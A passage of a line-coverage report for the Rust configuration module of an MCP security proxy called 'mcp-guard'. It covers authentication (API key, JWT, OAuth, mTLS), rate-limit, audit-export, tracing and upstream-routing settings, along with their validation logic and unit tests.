  117|       |    /// Claim to extract user ID from (CN or SAN)
  118|       |    /// Default: "cn" (Common Name)
  119|       |    #[serde(default = "default_mtls_identity_source")]
  120|       |    pub identity_source: MtlsIdentitySource,
  121|       |    /// Allowed tools for mTLS-authenticated identities (empty means all)
  122|       |    #[serde(default)]
  123|       |    pub allowed_tools: Vec<String>,
  124|       |    /// Custom rate limit for mTLS-authenticated identities
  125|       |    #[serde(default)]
  126|       |    pub rate_limit: Option<u32>,
  127|       |    /// Trusted proxy IP addresses/CIDR ranges that are allowed to set mTLS headers
  128|       |    /// SECURITY: If empty, mTLS header authentication is DISABLED to prevent header spoofing
  129|       |    /// You MUST configure this when using mTLS with a reverse proxy.
  130|       |    /// Example: ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.1"]
  131|       |    #[serde(default)]
  132|       |    pub trusted_proxy_ips: Vec<String>,
  133|       |}
  134|       |
  135|       |impl Default for MtlsConfig {
  136|      2|    fn default() -> Self {
  137|      2|        Self {
  138|      2|            enabled: false,
  139|      2|            identity_source: default_mtls_identity_source(),
  140|      2|            allowed_tools: vec![],
  141|      2|            rate_limit: None,
  142|      2|            trusted_proxy_ips: vec![],
  143|      2|        }
  144|      2|    }
  145|       |}
  146|       |
  147|       |/// Source for extracting identity from client certificate
  148|       |#[derive(Debug, Clone, Serialize, Deserialize)]
  149|       |#[serde(rename_all = "lowercase")]
  150|       |pub enum MtlsIdentitySource {
  151|       |    /// Extract from Common Name (CN)
  152|       |    Cn,
  153|       |    /// Extract from Subject Alternative Name (SAN) - DNS name
  154|       |    SanDns,
  155|       |    /// Extract from Subject Alternative Name (SAN) - Email
  156|       |    SanEmail,
  157|       |}
  158|       |
  159|      2|fn default_mtls_identity_source() -> MtlsIdentitySource {
  160|      2|    MtlsIdentitySource::Cn
  161|      2|}
  162|       |
  163|       |// ============================================================================
  164|       |// Authentication Configuration
  165|       |// ============================================================================
  166|       |
  167|       |/// Authentication configuration
  168|       |#[derive(Debug, Clone, Default, Serialize, Deserialize)]
  169|       |pub struct AuthConfig {
  170|       |    /// API key authentication
  171|       |    #[serde(default)]
  172|       |    pub api_keys: Vec<ApiKeyConfig>,
  173|       |
  174|       |    /// JWT authentication
  175|       |    #[serde(default)]
  176|       |    pub jwt: Option<JwtConfig>,
  177|       |
  178|       |    /// OAuth 2.1 configuration
  179|       |    #[serde(default)]
  180|       |    pub oauth: Option<OAuthConfig>,
  181|       |
  182|       |    /// mTLS client certificate authentication
  183|       |    #[serde(default)]
  184|       |    pub mtls: Option<MtlsConfig>,
  185|       |}
  186|       |
  187|       |/// API key configuration
  188|       |#[derive(Debug, Clone, Serialize, Deserialize)]
  189|       |pub struct ApiKeyConfig {
  190|       |    /// User/service identifier
  191|       |    pub id: String,
  192|       |
  193|       |    /// The hashed API key
  194|       |    pub key_hash: String,
  195|       |
  196|       |    /// Allowed tools (empty means all)
  197|       |    #[serde(default)]
  198|       |    pub allowed_tools: Vec<String>,
  199|       |
  200|       |    /// Custom rate limit (overrides global)
  201|       |    #[serde(default)]
  202|       |    pub rate_limit: Option<u32>,
  203|       |}
  204|       |
  205|       |/// JWT authentication mode
  206|       |#[derive(Debug, Clone, Serialize, Deserialize)]
  207|       |#[serde(tag = "mode", rename_all = "lowercase")]
  208|       |pub enum JwtMode {
  209|       |    /// Simple mode: HS256 with local secret
  210|       |    Simple {
  211|       |        /// Shared secret for HS256 signing (min 32 characters recommended)
  212|       |        secret: String,
  213|       |    },
  214|       |    /// JWKS mode: RS256/ES256 with remote JWKS endpoint
  215|       |    Jwks {
  216|       |        /// JWKS endpoint URL
  217|       |        jwks_url: String,
  218|       |        /// Allowed algorithms (default: ["RS256", "ES256"])
  219|       |        #[serde(default = "default_jwks_algorithms")]
  220|       |        algorithms: Vec<String>,
  221|       |        /// JWKS cache duration in seconds (default: 3600 = 1 hour)
  222|       |        #[serde(default = "default_cache_duration")]
  223|       |        cache_duration_secs: u64,
  224|       |    },
  225|       |}
  226|       |
  227|       |/// JWT configuration supporting both simple and JWKS modes
  228|       |#[derive(Debug, Clone, Serialize, Deserialize)]
  229|       |pub struct JwtConfig {
  230|       |    /// JWT validation mode (simple or jwks)
  231|       |    #[serde(flatten)]
  232|       |    pub mode: JwtMode,
  233|       |
  234|       |    /// Expected issuer (iss claim) - required for validation
  235|       |    pub issuer: String,
  236|       |
  237|       |    /// Expected audience (aud claim) - required for validation
  238|       |    pub audience: String,
  239|       |
  240|       |    /// Claim to extract user ID from (default: "sub")
  241|       |    #[serde(default = "default_user_id_claim")]
  242|       |    pub user_id_claim: String,
  243|       |
  244|       |    /// Claim to extract scopes from (default: "scope")
  245|       |    #[serde(default = "default_scopes_claim")]
  246|       |    pub scopes_claim: String,
  247|       |
  248|       |    /// Mapping from scopes to allowed tools
  249|       |    /// e.g., {"read:files": ["read_file", "list_files"], "admin": ["*"]}
  250|       |    #[serde(default)]
  251|       |    pub scope_tool_mapping: HashMap<String, Vec<String>>,
  252|       |
  253|       |    /// Leeway in seconds for exp/nbf validation (default: 0)
  254|       |    #[serde(default)]
  255|       |    pub leeway_secs: u64,
  256|       |}
  257|       |
  258|      1|fn default_jwks_algorithms() -> Vec<String> {
  259|      1|    vec!["RS256".to_string(), "ES256".to_string()]
  260|      1|}
  261|       |
  262|      0|fn default_cache_duration() -> u64 {
  263|      0|    3600 // 1 hour
  264|      0|}
  265|       |
  266|      0|fn default_user_id_claim() -> String {
  267|      0|    "sub".to_string()
  268|      0|}
  269|       |
  270|      0|fn default_scopes_claim() -> String {
  271|      0|    "scope".to_string()
  272|      0|}
  273|       |
  274|       |/// OAuth 2.1 provider type
  275|       |#[derive(Debug, Clone, Serialize, Deserialize)]
  276|       |#[serde(rename_all = "lowercase")]
  277|       |pub enum OAuthProvider {
  278|       |    /// GitHub OAuth
  279|       |    GitHub,
  280|       |    /// Google OAuth
  281|       |    Google,
  282|       |    /// Okta OAuth
  283|       |    Okta,
  284|       |    /// Custom OAuth provider
  285|       |    Custom,
  286|       |}
  287|       |
  288|       |/// OAuth 2.1 configuration
  289|       |#[derive(Debug, Clone, Serialize, Deserialize)]
  290|       |pub struct OAuthConfig {
  291|       |    /// OAuth provider type
  292|       |    pub provider: OAuthProvider,
  293|       |
  294|       |    /// Client ID
  295|       |    pub client_id: String,
  296|       |
  297|       |    /// Client secret (for confidential clients)
  298|       |    pub client_secret: Option<String>,
  299|       |
  300|       |    /// Authorization endpoint URL (required for custom, auto-derived for known providers)
  301|       |    pub authorization_url: Option<String>,
  302|       |
  303|       |    /// Token endpoint URL (required for custom, auto-derived for known providers)
  304|       |    pub token_url: Option<String>,
  305|       |
  306|       |    /// Token introspection endpoint URL (for validating opaque tokens)
  307|       |    pub introspection_url: Option<String>,
  308|       |
  309|       |    /// User info endpoint URL (fallback if no introspection)
  310|       |    pub userinfo_url: Option<String>,
  311|       |
  312|       |    /// Redirect URI for authorization code flow
  313|       |    #[serde(default = "default_redirect_uri")]
  314|       |    pub redirect_uri: String,
  315|       |
  316|       |    /// OAuth scopes to request
  317|       |    #[serde(default = "default_oauth_scopes")]
  318|       |    pub scopes: Vec<String>,
  319|       |
  320|       |    /// Claim to extract user ID from (default: "sub")
  321|       |    #[serde(default = "default_user_id_claim")]
  322|       |    pub user_id_claim: String,
  323|       |
  324|       |    /// Mapping from scopes to allowed tools (same as JWT)
  325|       |    #[serde(default)]
  326|       |    pub scope_tool_mapping: HashMap<String, Vec<String>>,
  327|       |}
  328|       |
  329|      0|fn default_redirect_uri() -> String {
  330|      0|    "http://localhost:3000/oauth/callback".to_string()
  331|      0|}
  332|       |
  333|      0|fn default_oauth_scopes() -> Vec<String> {
  334|      0|    vec!["openid".to_string(), "profile".to_string()]
  335|      0|}
  336|       |
  337|       |// ============================================================================
  338|       |// Rate Limiting Configuration
  339|       |// ============================================================================
  340|       |
  341|       |/// Rate limiting configuration
  342|       |#[derive(Debug, Clone, Serialize, Deserialize)]
  343|       |pub struct RateLimitConfig {
  344|       |    /// Enable rate limiting
  345|       |    #[serde(default = "default_true")]
  346|       |    pub enabled: bool,
  347|       |
  348|       |    /// Requests per second
  349|       |    #[serde(default = "default_rps")]
  350|       |    pub requests_per_second: u32,
  351|       |
  352|       |    /// Burst size
  353|       |    #[serde(default = "default_burst")]
  354|       |    pub burst_size: u32,
  355|       |}
  356|       |
  357|       |impl Default for RateLimitConfig {
  358|     39|    fn default() -> Self {
  359|     39|        Self {
  360|     39|            enabled: true,
  361|     39|            requests_per_second: default_rps(),
  362|     39|            burst_size: default_burst(),
  363|     39|        }
  364|     39|    }
  365|       |}
  366|       |
  367|      0|fn default_true() -> bool {
  368|      0|    true
  369|      0|}
  370|       |
  371|     44|fn default_rps() -> u32 {
  372|     44|    100
  373|     44|}
  374|       |
  375|     44|fn default_burst() -> u32 {
  376|     44|    50
  377|     44|}
  378|       |
  379|       |// ============================================================================
  380|       |// Audit Configuration
  381|       |// ============================================================================
  382|       |
  383|       |/// Audit logging configuration
  384|       |#[derive(Debug, Clone, Serialize, Deserialize)]
  385|       |pub struct AuditConfig {
  386|       |    /// Enable audit logging
  387|       |    #[serde(default = "default_true")]
  388|       |    pub enabled: bool,
  389|       |
  390|       |    /// Log file path
  391|       |    #[serde(default)]
  392|       |    pub file: Option<PathBuf>,
  393|       |
  394|       |    /// Log to stdout
  395|       |    #[serde(default)]
  396|       |    pub stdout: bool,
  397|       |
  398|       |    /// HTTP export URL for SIEM integration (e.g., "https://siem.example.com/logs")
  399|       |    /// If set, audit logs will be batched and sent to this endpoint
  400|       |    #[serde(default)]
  401|       |    pub export_url: Option<String>,
  402|       |
  403|       |    /// Number of logs to batch before sending (default: 100)
  404|       |    #[serde(default = "default_export_batch_size")]
  405|       |    pub export_batch_size: usize,
  406|       |
  407|       |    /// Interval in seconds to flush logs even if batch is not full (default: 30)
  408|       |    #[serde(default = "default_export_interval_secs")]
  409|       |    pub export_interval_secs: u64,
  410|       |
  411|       |    /// Additional headers to include in export requests (e.g., for authentication)
  412|       |    #[serde(default)]
  413|       |    pub export_headers: HashMap<String, String>,
  414|       |}
  415|       |
  416|     48|fn default_export_batch_size() -> usize {
  417|     48|    100
  418|     48|}
  419|       |
  420|     48|fn default_export_interval_secs() -> u64 {
  421|     48|    30
  422|     48|}
  423|       |
  424|       |impl Default for AuditConfig {
  425|     47|    fn default() -> Self {
  426|     47|        Self {
  427|     47|            enabled: true,
  428|     47|            file: None,
  429|     47|            stdout: true,
  430|     47|            export_url: None,
  431|     47|            export_batch_size: default_export_batch_size(),
  432|     47|            export_interval_secs: default_export_interval_secs(),
  433|     47|            export_headers: HashMap::new(),
  434|     47|        }
  435|     47|    }
  436|       |}
  437|       |
  438|       |// ============================================================================
  439|       |// Tracing Configuration
  440|       |// ============================================================================
  441|       |
  442|       |/// OpenTelemetry tracing configuration
  443|       |#[derive(Debug, Clone, Serialize, Deserialize)]
  444|       |pub struct TracingConfig {
  445|       |    /// Enable OpenTelemetry distributed tracing
  446|       |    #[serde(default)]
  447|       |    pub enabled: bool,
  448|       |
  449|       |    /// Service name for traces (default: "mcp-guard")
  450|       |    #[serde(default = "default_service_name")]
  451|       |    pub service_name: String,
  452|       |
  453|       |    /// OTLP exporter endpoint (e.g., "http://localhost:4317" for gRPC)
  454|       |    /// If not set, traces are only logged locally
  455|       |    pub otlp_endpoint: Option<String>,
  456|       |
  457|       |    /// Sample rate (0.0 to 1.0, default: 1.0 = sample all)
  458|       |    #[serde(default = "default_sample_rate")]
  459|       |    pub sample_rate: f64,
  460|       |
  461|       |    /// Propagate W3C trace context headers (traceparent, tracestate)
  462|       |    #[serde(default = "default_true")]
  463|       |    pub propagate_context: bool,
  464|       |}
  465|       |
  466|       |impl Default for TracingConfig {
  467|     50|    fn default() -> Self {
  468|     50|        Self {
  469|     50|            enabled: false,
  470|     50|            service_name: default_service_name(),
  471|     50|            otlp_endpoint: None,
  472|     50|            sample_rate: default_sample_rate(),
  473|     50|            propagate_context: true,
  474|     50|        }
  475|     50|    }
  476|       |}
  477|       |
  478|     50|fn default_service_name() -> String {
  479|     50|    "mcp-guard".to_string()
  480|     50|}
  481|       |
  482|     50|fn default_sample_rate() -> f64 {
  483|     50|    1.0
  484|     50|}
  485|       |
  486|       |// ============================================================================
  487|       |// Upstream Configuration
  488|       |// ============================================================================
  489|       |
  490|       |/// Upstream MCP server configuration
  491|       |#[derive(Debug, Clone, Serialize, Deserialize)]
  492|       |pub struct UpstreamConfig {
  493|       |    /// Transport type (used for single-server mode)
  494|       |    pub transport: TransportType,
  495|       |
  496|       |    /// Command to run (for stdio transport)
  497|       |    pub command: Option<String>,
  498|       |
  499|       |    /// Arguments for the command
  500|       |    #[serde(default)]
  501|       |    pub args: Vec<String>,
  502|       |
  503|       |    /// URL for HTTP transport
  504|       |    pub url: Option<String>,
  505|       |
  506|       |    /// Multiple server routes (if configured, path-based routing is enabled)
  507|       |    /// Requests are routed based on path prefix matching
  508|       |    #[serde(default)]
  509|       |    pub servers: Vec<ServerRouteConfig>,
  510|       |}
  511|       |
  512|       |/// Server route configuration for multi-server routing
  513|       |#[derive(Debug, Clone, Serialize, Deserialize)]
  514|       |pub struct ServerRouteConfig {
  515|       |    /// Unique name for this server
  516|       |    pub name: String,
  517|       |
  518|       |    /// Path prefix to match (e.g., "/github", "/filesystem")
  519|       |    /// Requests with this prefix are routed to this server
  520|       |    pub path_prefix: String,
  521|       |
  522|       |    /// Transport type for this server
  523|       |    pub transport: TransportType,
  524|       |
  525|       |    /// Command to run (for stdio transport)
  526|       |    pub command: Option<String>,
  527|       |
  528|       |    /// Arguments for the command
  529|       |    #[serde(default)]
  530|       |    pub args: Vec<String>,
  531|       |
  532|       |    /// URL for HTTP/SSE transport
  533|       |    pub url: Option<String>,
  534|       |
  535|       |    /// Strip the path prefix when forwarding requests
  536|       |    /// If true, "/github/repos" becomes "/repos" when sent to the server
  537|       |    #[serde(default)]
  538|       |    pub strip_prefix: bool,
  539|       |}
  540|       |
  541|       |/// Transport type for upstream connection
  542|       |#[derive(Debug, Clone, Serialize, Deserialize)]
  543|       |#[serde(rename_all = "lowercase")]
  544|       |pub enum TransportType {
  545|       |    Stdio,
  546|       |    Http,
  547|       |    Sse,
  548|       |}
  549|       |
  550|       |// ============================================================================
  551|       |// Implementation
  552|       |// ============================================================================
  553|       |
  554|       |impl Config {
  555|       |    /// Load configuration from a file
  556|     15|    pub fn from_file(path: &PathBuf) -> Result<Self, ConfigError> {
  557|     15|        let content = std::fs::read_to_string(path)?;
                          ^10                                    ^5
  558|       |
  559|     10|        let config: Config = if path.extension().map(|e| e == "yaml" || e == "yml").unwrap_or(false) {
                          ^6      ^6
  560|      0|            serde_yaml::from_str(&content).map_err(|e| ConfigError::Parse(e.to_string()))?
  561|       |        } else {
  562|     10|            toml::from_str(&content).map_err(|e| ConfigError::Parse(e.to_string()))?
                                                                                  ^4^4           ^4
  563|       |        };
  564|       |
  565|      6|        config.validate()?;
                                       ^0
  566|      6|        Ok(config)
  567|     15|    }
  568|       |
  569|       |    /// Validate the configuration
  570|     33|    pub fn validate(&self) -> Result<(), ConfigError> {
  571|       |        // Validate server port (must be 1-65535, not 0)
  572|     33|        if self.server.port == 0 {
  573|      2|            return Err(ConfigError::Validation(
  574|      2|                "server.port must be between 1 and 65535".to_string(),
  575|      2|            ));
  576|     31|        }
  577|       |
  578|       |        // Validate rate limit settings
  579|     31|        if self.rate_limit.enabled {
  580|     26|            if self.rate_limit.requests_per_second == 0 {
  581|      2|                return Err(ConfigError::Validation(
  582|      2|                    "rate_limit.requests_per_second must be greater than 0".to_string(),
  583|      2|                ));
  584|     24|            }
  585|     24|            if self.rate_limit.burst_size == 0 {
  586|      2|                return Err(ConfigError::Validation(
  587|      2|                    "rate_limit.burst_size must be greater than 0".to_string(),
  588|      2|                ));
  589|     22|            }
  590|      5|        }
  591|       |
  592|       |        // Validate JWT configuration
  593|     27|        if let Some(ref jwt_config) = self.auth.jwt {
                                  ^1
  594|      1|            if let JwtMode::Jwks { ref jwks_url, .. } = jwt_config.mode {
  595|       |                // JWKS URL must use HTTPS in production (allow HTTP in debug builds for local testing)
  596|       |                #[cfg(not(debug_assertions))]
  597|       |                if !jwks_url.starts_with("https://") {
  598|       |                    return Err(ConfigError::Validation(
  599|       |                        "jwt.jwks_url must use HTTPS in production".to_string(),
  600|       |                    ));
  601|       |                }
  602|       |                // Validate URL format
  603|      1|                if !jwks_url.starts_with("http://") && !jwks_url.starts_with("https://") {
  604|      1|                    return Err(ConfigError::Validation(
  605|      1|                        "jwt.jwks_url must be a valid HTTP(S) URL".to_string(),
  606|      1|                    ));
  607|      0|                }
  608|      0|            }
  609|     26|        }
  610|       |
  611|       |        // Validate OAuth configuration
  612|     26|        if let Some(ref oauth_config) = self.auth.oauth {
                                  ^1
  613|       |            // Validate redirect_uri is a valid URL
  614|      1|            if !oauth_config.redirect_uri.starts_with("http://")
  615|      1|                && !oauth_config.redirect_uri.starts_with("https://") {
  616|      1|                return Err(ConfigError::Validation(
  617|      1|                    "oauth.redirect_uri must be a valid HTTP(S) URL".to_string(),
  618|      1|                ));
  619|      0|            }
  620|     25|        }
  621|       |
  622|       |        // Validate audit export configuration
  623|     25|        if let Some(ref export_url) = self.audit.export_url {
                                  ^6
  624|       |            // Validate URL format
  625|      6|            if !export_url.starts_with("http://") && !export_url.starts_with("https://") {
                                                                   ^3
  626|      2|                return Err(ConfigError::Validation(
  627|      2|                    "audit.export_url must be a valid HTTP(S) URL".to_string(),
  628|      2|                ));
  629|      4|            }
  630|       |            // Validate batch size
  631|      4|            if self.audit.export_batch_size == 0 {
  632|      2|                return Err(ConfigError::Validation(
  633|      2|                    "audit.export_batch_size must be greater than 0".to_string(),
  634|      2|                ));
  635|      2|            }
  636|      2|            if self.audit.export_batch_size > 10000 {
  637|      1|                return Err(ConfigError::Validation(
  638|      1|                    "audit.export_batch_size must be less than or equal to 10000".to_string(),
  639|      1|                ));
  640|      1|            }
  641|       |            // Validate flush interval
  642|      1|            if self.audit.export_interval_secs == 0 {
  643|      1|                return Err(ConfigError::Validation(
  644|      1|                    "audit.export_interval_secs must be greater than 0".to_string(),
  645|      1|                ));
  646|      0|            }
  647|     19|        }
  648|       |
  649|       |        // Validate tracing sample rate
  650|     19|        if self.tracing.enabled
  651|      3|            && (self.tracing.sample_rate < 0.0 || self.tracing.sample_rate > 1.0)
                                                                ^2
  652|       |        {
  653|      3|            return Err(ConfigError::Validation(
  654|      3|                "tracing.sample_rate must be between 0.0 and 1.0".to_string(),
  655|      3|            ));
  656|     16|        }
  657|       |
  658|       |        // If multi-server routing is configured, validate each server
  659|     16|        if !self.upstream.servers.is_empty() {
  660|      0|            for server in &self.upstream.servers {
  661|      0|                server.validate()?;
  662|       |            }
  663|      0|            return Ok(());
  664|     16|        }
  665|       |
  666|       |        // Single-server mode validation
  667|     16|        match self.upstream.transport {
  668|       |            TransportType::Stdio => {
  669|      7|                if self.upstream.command.is_none() {
  670|      2|                    return Err(ConfigError::Validation(
  671|      2|                        "stdio transport requires 'command' to be set".to_string(),
  672|      2|                    ));
  673|      5|                }
  674|       |            }
  675|       |            TransportType::Http | TransportType::Sse => {
  676|      9|                if self.upstream.url.is_none() {
  677|      4|                    return Err(ConfigError::Validation(
  678|      4|                        "http/sse transport requires 'url' to be set".to_string(),
  679|      4|                    ));
  680|      5|                }
  681|       |            }
  682|       |        }
  683|       |
  684|     10|        Ok(())
  685|     33|    }
  686|       |
  687|       |    /// Check if multi-server routing is enabled
  688|      4|    pub fn is_multi_server(&self) -> bool {
  689|      4|        !self.upstream.servers.is_empty()
  690|      4|    }
  691|       |}
  692|       |
  693|       |impl ServerRouteConfig {
  694|       |    /// Validate the server route configuration
  695|     10|    pub fn validate(&self) -> Result<(), ConfigError> {
  696|     10|        if self.name.is_empty() {
  697|      2|            return Err(ConfigError::Validation(
  698|      2|                "Server route 'name' cannot be empty".to_string(),
  699|      2|            ));
  700|      8|        }
  701|       |
  702|      8|        if self.path_prefix.is_empty() {
  703|      0|            return Err(ConfigError::Validation(format!(
  704|      0|                "Server route '{}' path_prefix cannot be empty",
  705|      0|                self.name
  706|      0|            )));
  707|      8|        }
  708|       |
  709|      8|        if !self.path_prefix.starts_with('/') {
  710|      2|            return Err(ConfigError::Validation(format!(
  711|      2|                "Server route '{}' path_prefix must start with '/'",
  712|      2|                self.name
  713|      2|            )));
  714|      6|        }
  715|       |
  716|      6|        match self.transport {
  717|       |            TransportType::Stdio => {
  718|      2|                if self.command.is_none() {
  719|      1|                    return Err(ConfigError::Validation(format!(
  720|      1|                        "Server route '{}' with stdio transport requires 'command' to be set",
  721|      1|                        self.name
  722|      1|                    )));
  723|      1|                }
  724|       |            }
  725|       |            TransportType::Http | TransportType::Sse => {
  726|      4|                if self.url.is_none() {
  727|      2|                    return Err(ConfigError::Validation(format!(
  728|      2|                        "Server route '{}' with http/sse transport requires 'url' to be set",
  729|      2|                        self.name
  730|      2|                    )));
  731|      2|                }
  732|       |            }
  733|       |        }
  734|       |
  735|      3|        Ok(())
  736|     10|    }
  737|       |}
  738|       |
  739|       |// ============================================================================
  740|       |// Tests
  741|       |// ============================================================================
  742|       |
  743|       |#[cfg(test)]
  744|       |mod tests {
  745|       |    use super::*;
  746|       |
  747|     15|    fn create_valid_config() -> Config {
  748|     15|        Config {
  749|     15|            server: ServerConfig::default(),
  750|     15|            auth: AuthConfig::default(),
  751|     15|            rate_limit: RateLimitConfig::default(),
  752|     15|            audit: AuditConfig::default(),
  753|     15|            tracing: TracingConfig::default(),
  754|     15|            upstream: UpstreamConfig {
  755|     15|                transport: TransportType::Http,
  756|     15|                command: None,
  757|     15|                args: vec![],
  758|     15|                url: Some("http://localhost:8080".to_string()),
  759|     15|                servers: vec![],
  760|     15|            },
  761|     15|        }
  762|     15|    }
  763|       |
  764|       |    // ------------------------------------------------------------------------
  765|       |    // Default Tests
  766|       |    // ------------------------------------------------------------------------
  767|       |
  768|       |    #[test]
  769|      1|    fn test_server_config_defaults() {
  770|      1|        let config = ServerConfig::default();
  771|      1|        assert_eq!(config.host, "127.0.0.1");
  772|      1|        assert_eq!(config.port, 3000);
  773|      1|        assert!(config.tls.is_none());
  774|      1|    }
  775|       |
  776|       |    #[test]
  777|      1|    fn test_rate_limit_config_defaults() {
  778|      1|        let config = RateLimitConfig::default();
  779|      1|        assert!(config.enabled);
  780|      1|        assert_eq!(config.requests_per_second, 100);
  781|      1|        assert_eq!(config.burst_size, 50);
  782|      1|    }
  783|       |
  784|       |    #[test]
  785|      1|    fn test_audit_config_defaults() {
  786|      1|        let config = AuditConfig::default();
  787|      1|        assert!(config.enabled);
  788|      1|        assert!(config.file.is_none());
  789|      1|        assert!(config.stdout);
  790|      1|        assert!(config.export_url.is_none());
  791|      1|        assert_eq!(config.export_batch_size, 100);
  792|      1|        assert_eq!(config.export_interval_secs, 30);
  793|      1|    }
  794|       |
  795|       |    #[test]
  796|      1|    fn test_tracing_config_defaults() {
  797|      1|        let config = TracingConfig::default();
  798|      1|        assert!(!config.enabled);
  799|      1|        assert_eq!(config.service_name, "mcp-guard");
  800|      1|        assert!(config.otlp_endpoint.is_none());
  801|      1|        assert_eq!(config.sample_rate, 1.0);
  802|      1|        assert!(config.propagate_context);
  803|      1|    }
  804|       |
  805|       |    #[test]
  806|      1|    fn test_mtls_config_defaults() {
  807|      1|        let config = MtlsConfig::default();
  808|      1|        assert!(!config.enabled);
  809|      1|        assert!(matches!(config.identity_source, MtlsIdentitySource::Cn));
                              ^0
  810|      1|        assert!(config.allowed_tools.is_empty());
  811|      1|        assert!(config.rate_limit.is_none());
  812|      1|    }
  813|       |
  814|       |    // ------------------------------------------------------------------------
  815|       |    // Validation Tests
  816|       |    // ------------------------------------------------------------------------
  817|       |
  818|       |    #[test]
  819|      1|    fn test_config_validation_success() {
  820|      1|        let config = create_valid_config();
  821|      1|        assert!(config.validate().is_ok());
  822|      1|    }
  823|       |
  824|       |    #[test]
  825|      1|    fn test_config_validation_invalid_port() {
  826|      1|        let mut config = create_valid_config();
  827|      1|        config.server.port = 0;
  828|      1|        assert!(config.validate().is_err());
  829|      1|    }
  830|       |
  831|       |    #[test]
  832|      1|    fn test_config_validation_rate_limit_zero_rps() {
  833|      1|        let mut config = create_valid_config();
  834|      1|        config.rate_limit.enabled = true;
  835|      1|        config.rate_limit.requests_per_second = 0;
  836|      1|        assert!(config.validate().is_err());
  837|      1|    }
  838|       |
  839|       |    #[test]
  840|      1|    fn test_config_validation_rate_limit_zero_burst() {
  841|      1|        let mut config = create_valid_config();
  842|      1|        config.rate_limit.enabled = true;
  843|      1|        config.rate_limit.burst_size = 0;
  844|      1|        assert!(config.validate().is_err());
  845|      1|    }
  846|       |
  847|       |    #[test]
  848|      1|    fn test_config_validation_stdio_missing_command() {
  849|      1|        let mut config = create_valid_config();
  850|      1|        config.upstream.transport = TransportType::Stdio;
  851|      1|        config.upstream.command = None;
  852|      1|        config.upstream.url = None;
  853|      1|        assert!(config.validate().is_err());
  854|      1|    }
  855|       |
  856|       |    #[test]
  857|      1|    fn test_config_validation_http_missing_url() {
  858|      1|        let mut config = create_valid_config();
  859|      1|        config.upstream.transport = TransportType::Http;
  860|      1|        config.upstream.url = None;
  861|      1|        assert!(config.validate().is_err());
  862|      1|    }
  863|       |
  864|       |    #[test]
  865|      1|    fn test_config_validation_sse_missing_url() {
  866|      1|        let mut config = create_valid_config();
  867|      1|        config.upstream.transport = TransportType::Sse;
  868|      1|        config.upstream.url = None;
  869|      1|        assert!(config.validate().is_err());
  870|      1|    }
  871|       |
  872|       |    #[test]
  873|      1|    fn test_config_validation_jwt_invalid_jwks_url() {
  874|      1|        let mut config = create_valid_config();
  875|      1|        config.auth.jwt = Some(JwtConfig {
  876|      1|            mode: JwtMode::Jwks {
  877|      1|                jwks_url: "invalid-url".to_string(),
  878|      1|                algorithms: default_jwks_algorithms(),
  879|      1|                cache_duration_secs: 3600,
  880|      1|            },
  881|      1|            issuer: "https://issuer.example.com".to_string(),
  882|      1|            audience: "mcp-guard".to_string(),
  883|      1|            user_id_claim: "sub".to_string(),
  884|      1|            scopes_claim: "scope".to_string(),
  885|      1|            scope_tool_mapping: HashMap::new(),
  886|      1|            leeway_secs: 0,
  887|      1|        });
  888|      1|        assert!(config.validate().is_err());
  889|      1|    }
  890|       |
  891|       |    #[test]
  892|      1|    fn test_config_validation_oauth_invalid_redirect_uri() {
  893|      1|        let mut config = create_valid_config();
  894|      1|        config.auth.oauth = Some(OAuthConfig {
  895|      1|            provider: OAuthProvider::GitHub,
  896|      1|            client_id: "test".to_string(),
  897|      1|            client_secret: None,
  898|      1|            authorization_url: None,
  899|      1|            token_url: None,
  900|      1|            introspection_url: None,
  901|      1|            userinfo_url: None,
  902|      1|            redirect_uri: "invalid-uri".to_string(),
  903|      1|            scopes: vec![],
  904|      1|            user_id_claim: "sub".to_string(),
  905|      1|            scope_tool_mapping: HashMap::new(),
  906|      1|        });
  907|      1|        assert!(config.validate().is_err());
  908|      1|    }
  909|       |
  910|       |    #[test]
  911|      1|    fn test_config_validation_audit_invalid_export_url() {
  912|      1|        let mut config = create_valid_config();
  913|      1|        config.audit.export_url = Some("not-a-url".to_string());
  914|      1|        assert!(config.validate().is_err());
  915|      1|    }
  916|       |
  917|       |    #[test]
  918|      1|    fn test_config_validation_audit_batch_size_zero() {
  919|      1|        let mut config = create_valid_config();
  920|      1|        config.audit.export_url = Some("http://siem.example.com".to_string());
  921|      1|        config.audit.export_batch_size = 0;
  922|      1|        assert!(config.validate().is_err());
  923|      1|    }
  924|       |
  925|       |    #[test]
  926|      1|    fn test_config_validation_audit_batch_size_too_large() {
  927|      1|        let mut config = create_valid_config();
  928|      1|        config.audit.export_url = Some("http://siem.example.com".to_string());
  929|      1|        config.audit.export_batch_size = 10001;
  930|      1|        assert!(config.validate().is_err());
  931|      1|    }
  932|       |
  933|       |    #[test]
  934|      1|    fn test_config_validation_audit_interval_zero() {
  935|      1|        let mut config = create_valid_config();
  936|      1|        config.audit.export_url = Some("http://siem.example.com".to_string());
  937|      1|        config.audit.export_interval_secs = 0;
  938|      1|        assert!(config.validate().is_err());
  939|      1|    }
  940|       |
  941|       |    #[test]
  942|      1|    fn test_config_validation_tracing_invalid_sample_rate() {
  943|      1|        let mut config = create_valid_config();
  944|      1|        config.tracing.enabled = true;
  945|      1|        config.tracing.sample_rate = 1.5;
  946|      1|        assert!(config.validate().is_err());
  947|       |
  948|      1|        config.tracing.sample_rate = -0.1;
  949|      1|        assert!(config.validate().is_err());
  950|      1|    }
  951|       |
  952|       |    #[test]
  953|      1|    fn test_config_is_multi_server() {
  954|      1|        let mut config = create_valid_config();
  955|      1|        assert!(!config.is_multi_server());
  956|       |
  957|      1|        config.upstream.servers.push(ServerRouteConfig {
  958|      1|            name: "test".to_string(),
  959|      1|            path_prefix: "/test".to_string(),
  960|      1|            transport: TransportType::Http,
  961|      1|            command: None,
  962|      1|            args: vec![],
  963|      1|            url: Some("http://localhost:8080".to_string()),
  964|      1|            strip_prefix: false,
  965|      1|        });
  966|      1|        assert!(config.is_multi_server());
  967|      1|    }
  968|       |
  969|       |    // ------------------------------------------------------------------------
  970|       |    // ConfigError Tests
  971|       |    // ------------------------------------------------------------------------
  972|       |
  973|       |    #[test]
  974|      1|    fn test_config_error_display() {
  975|      1|        let err = ConfigError::Parse("invalid TOML".to_string());
  976|      1|        assert!(format!("{}", err).contains("invalid TOML"));
  977|       |
  978|      1|        let err = ConfigError::Validation("port must be > 0".to_string());
  979|      1|        assert!(format!("{}", err).contains("port must be > 0"));
  980|      1|    }
  981|       |
  982|       |    // ------------------------------------------------------------------------
  983|       |    // Transport Type Tests
